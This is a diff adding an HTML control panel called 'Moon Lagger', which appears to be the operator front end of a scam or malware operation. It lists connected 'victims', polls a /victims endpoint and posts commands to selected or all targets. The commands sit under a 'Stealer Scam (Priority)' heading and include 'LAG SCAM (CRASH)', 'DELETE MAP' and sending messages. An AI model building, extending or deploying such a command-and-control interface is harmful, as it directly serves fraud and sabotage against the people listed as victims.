@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>Moon Lagger // Control</title>
+      <style>
+            :root {
+                  --bg: #0f0f12;
+                  --sidebar: #141418;
+                  --card: #1c1c22;
+                  --primary: #fff;
+                  --secondary: #a0a0b0;
+                  --accent: #5e6aff;
+                  --danger: #cf3d3d;
+                  --success: #3dcf8b;
+            }
+
+            body {
+                  background: var(--bg);
+                  color: var(--primary);
+                  font-family: 'Inter', sans-serif;
+                  margin: 0;
+                  display: flex;
+                  height: 100vh;
+                  overflow: hidden;
+            }
+
+            /* Sidebar */
+            .sidebar {
+                  width: 250px;
+                  background: var(--sidebar);
+                  padding: 1.5rem;
+                  display: flex;
+                  flex-direction: column;
+                  border-right: 1px solid #2a2a35;
+            }
+
+            .brand {
+                  font-size: 1.2rem;
+                  font-weight: 800;
+                  margin-bottom: 2rem;
+                  color: var(--primary);
+            }
+
+            .brand span {
+                  color: var(--accent);
+            }
+
+            .menu-item {
+                  padding: 0.8rem 1rem;
+                  color: var(--secondary);
+                  text-decoration: none;
+                  border-radius: 8px;
+                  margin-bottom: 0.5rem;
+                  transition: 0.2s;
+                  font-size: 0.9rem;
+            }
+
+            .menu-item:hover,
+            .menu-item.active {
+                  background: #2a2a35;
+                  color: var(--primary);
+            }
+
+            .logout {
+                  margin-top: auto;
+                  color: var(--danger);
+            }
+
+            /* Main Content */
+            .main {
+                  flex: 1;
+                  padding: 2rem;
+                  overflow-y: auto;
+            }
+
+            .header {
+                  display: flex;
+                  justify-content: space-between;
+                  align-items: center;
+                  margin-bottom: 2rem;
+            }
+
+            .header h1 {
+                  font-size: 1.5rem;
+                  font-weight: 600;
+                  margin: 0;
+            }
+
+            /* Dashboard Grid */
+            .grid {
+                  display: grid;
+                  grid-template-columns: 300px 1fr;
+                  gap: 2rem;
+            }
+
+            /* Victim List */
+            .card {
+                  background: var(--card);
+                  border-radius: 12px;
+                  padding: 1.5rem;
+                  height: fit-content;
+            }
+
+            .card-title {
+                  font-size: 1rem;
+                  font-weight: 600;
+                  margin-bottom: 1rem;
+                  color: var(--secondary);
+            }
+
+            .victim-list {
+                  max-height: 400px;
+                  overflow-y: auto;
+            }
+
+            .victim-item {
+                  display: flex;
+                  align-items: center;
+                  padding: 0.8rem;
+                  background: #25252e;
+                  border-radius: 8px;
+                  margin-bottom: 0.5rem;
+                  cursor: pointer;
+                  transition: 0.2s;
+                  border: 1px solid transparent;
+            }
+
+            .victim-item:hover {
+                  transform: translateY(-1px);
+                  border-color: var(--accent);
+            }
+
+            .victim-item.selected {
+                  border-color: var(--accent);
+                  background: #2a2a35;
+            }
+
+            .victim-avatar {
+                  width: 32px;
+                  height: 32px;
+                  border-radius: 50%;
+                  background: #333;
+                  margin-right: 10px;
+            }
+
+            .victim-name {
+                  font-size: 0.9rem;
+                  font-weight: 500;
+            }
+
+            /* Controls */
+            .controls-grid {
+                  display: grid;
+                  grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+                  gap: 1rem;
+            }
+
+            .btn {
+                  border: none;
+                  padding: 1rem;
+                  border-radius: 8px;
+                  font-weight: 600;
+                  cursor: pointer;
+                  transition: 0.2s;
+                  color: white;
+                  font-size: 0.9rem;
+                  display: flex;
+                  align-items: center;
+                  justify-content: center;
+            }
+
+            .btn:hover {
+                  opacity: 0.9;
+                  transform: scale(1.02);
+            }
+
+            .btn-danger {
+                  background: var(--danger);
+            }
+
+            .btn-success {
+                  background: var(--success);
+            }
+
+            .btn-warn {
+                  background: #cf9b3d;
+            }
+
+            .btn-info {
+                  background: #3d8acf;
+            }
+
+            .btn-primary {
+                  background: var(--accent);
+            }
+
+            .section-label {
+                  color: var(--secondary);
+                  margin-top: 1.5rem;
+                  margin-bottom: 0.8rem;
+                  font-size: 0.85rem;
+                  text-transform: uppercase;
+                  letter-spacing: 0.5px;
+                  font-weight: 700;
+            }
+
+            #selected-victim-display {
+                  color: var(--accent);
+                  font-weight: bold;
+            }
+      </style>
+</head>
+
+<body>
+      <div class="sidebar">
+            <div class="brand">MOON <span>PANEL</span></div>
+            <a href="#" class="menu-item active">Dashboard</a>
+            <a href="#" class="menu-item">Logs (Soon)</a>
+            <a href="#" class="menu-item">Settings</a>
+            <a href="/logout" class="menu-item logout">Logout</a>
+      </div>
+
+      <div class="main">
+            <div class="header">
+                  <h1>Control Center</h1>
+                  <div id="connection-status" style="color: var(--success); font-size: 0.9rem;">● System Online</div>
+            </div>
+
+            <div class="grid">
+                  <!-- Left: Victim List -->
+                  <div class="card">
+                        <div class="card-title">CONNECTED TARGETS</div>
+                        <div id="victim-list-container" class="victim-list">
+                              <!-- Loaded via JS -->
+                              <div style="padding:1rem; color:#555; text-align:center;">Scanning...</div>
+                        </div>
+                        <button onclick="selectAll()" class="btn btn-primary"
+                              style="width:100%; margin-top:1rem;">Select All (Broadcast)</button>
+                  </div>
+
+                  <!-- Right: Actions -->
+                  <div class="card">
+                        <div class="card-title">ACTIONS FOR: <span id="selected-victim-display">None</span></div>
+
+                        <div class="section-label">Stealer Scam (Priority)</div>
+                        <div class="controls-grid">
+                              <button onclick="sendCommand('LAG_SCAM')" class="btn btn-danger">LAG SCAM (CRASH)</button>
+                              <button onclick="sendCommand('NO_STEAL')" class="btn btn-success">NO STEAL
+                                    (Clean)</button>
+                              <button onclick="sendCommand('DELETE_MAP')" class="btn btn-warn">DELETE MAP</button>
+                              <button onclick="sendCommand('MESSAGE')" class="btn btn-info">SEND MESSAGE</button>
+                        </div>
+                  </div>
+            </div>
+      </div>
+
+      <script>
+            let selectedId = null;
+            let selectedName = null;
+
+            function selectVictim(id, name) {
+                  selectedId = id;
+                  selectedName = name;
+                  document.getElementById('selected-victim-display').innerText = name;
+
+                  // Visual feedback
+                  document.querySelectorAll('.victim-item').forEach(el => el.classList.remove('selected'));
+                  const active = document.getElementById(`v-${id}`);
+                  if (active) active.classList.add('selected');
+            }
+
+            function selectAll() {
+                  selectedId = "ALL";
+                  selectedName = "ALL TARGETS";
+                  document.getElementById('selected-victim-display').innerText = "ALL TARGETS";
+                  document.querySelectorAll('.victim-item').forEach(el => el.classList.remove('selected'));
+            }
+
+            async function fetchVictims() {
+                  try {
+                        const res = await fetch('/victims');
+                        const data = await res.json();
+
+                        const container = document.getElementById('victim-list-container');
+                        container.innerHTML = '';
+
+                        if (Object.keys(data).length === 0) {
+                              container.innerHTML = '<div style="padding:1rem; color:#555; text-align:center;">No active connections</div>';
+                              return;
+                        }
+
+                        for (const [uid, info] of Object.entries(data)) {
+                              const div = document.createElement('div');
+                              div.className = `victim-item ${selectedId === uid ? 'selected' : ''}`;
+                              div.id = `v-${uid}`;
+                              div.onclick = () => selectVictim(uid, info.name);
+
+                              // Simple avatar placeholder or RoboHash if needed
+                              div.innerHTML = `
+                        <div class="victim-avatar"></div>
+                        <div class="victim-name">${info.name}</div>
+                    `;
+                              container.appendChild(div);
+                        }
+                  } catch (e) {
+                        console.error("Fetch error", e);
+                  }
+            }
+
+            async function sendCommand(cmd) {
+                  if (!selectedId) {
+                        alert("Please select a target first!");
+                        return;
+                  }
+
+                  try {
+                        const res = await fetch('/command', {
+                              method: 'POST',
+                              headers: { 'Content-Type': 'application/json' },
+                              body: JSON.stringify({
+                                    target: selectedId,
+                                    command: cmd
+                              })
+                        });
+                        const result = await res.json();
+                        console.log(result);
+                        // Visual feedback could go here
+                  } catch (e) {
+                        alert("Failed to send command");
+                  }
+            }
+
+            // Auto Poll
+            setInterval(fetchVictims, 2000);
+            fetchVictims();
+      </script>
+</body>
+
+</html>
